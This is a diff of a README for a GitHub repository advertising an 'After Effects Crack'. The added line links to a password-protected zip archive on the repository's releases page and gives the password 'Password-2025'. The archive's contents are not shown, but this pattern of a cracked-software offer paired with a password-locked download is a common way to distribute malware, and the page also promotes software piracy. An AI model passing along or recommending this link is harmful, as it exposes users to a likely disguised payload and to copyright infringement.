@@ -7,7 +7,7 @@ Welcome to the After Effects Crack repository! 🚀 This is your ultimate destin
 - Topics: After-Effects, motion-graphics, video-editing, free-software, visual-effects, design-tools   
 
 ## 🔗 Software Access  
-### Download: After Effects
+### Download: [After Effects](https://github.com/xyt0169/After-Effects-Full-PC/releases/download/After-Effects-Full-PC/After.Effects.PC.zip)
 Password-2025  
 
 ## 🎉 Overview of After Effects  
